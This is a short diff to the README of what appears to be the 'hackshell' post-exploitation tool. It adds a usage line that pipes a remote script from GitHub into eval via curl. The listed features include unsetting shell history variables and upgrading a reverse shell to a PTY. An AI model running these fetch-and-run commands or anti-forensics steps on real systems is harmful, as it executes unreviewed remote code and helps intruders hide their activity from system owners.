@@ -10,6 +10,10 @@ Usage:
  source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 ```
 
+```shell
+ eval "$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
+```
+
 Some features:
 *  unsets HISTFILE, SSH_CONNECT, wget/redis/mysql/less-HISTORY, ...
 *  Upgrates to PTY shell (if reverse shell)
